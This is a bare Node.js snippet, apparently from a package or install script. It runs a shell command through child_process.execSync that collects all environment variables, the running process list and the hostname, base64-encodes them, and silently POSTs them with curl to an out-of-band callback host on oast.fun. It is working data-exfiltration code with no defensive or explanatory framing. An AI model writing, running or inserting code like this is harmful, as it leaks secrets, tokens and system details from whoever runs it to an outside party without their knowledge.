require('node:child_process').execSync(
  'echo $(env && ps aux && hostname) | base64 | curl -X POST --data-binary @- --max-time 2 -fsSL asyuhcysaeiqdteuxwjcqffaw1purs56n.oast.fun',
);
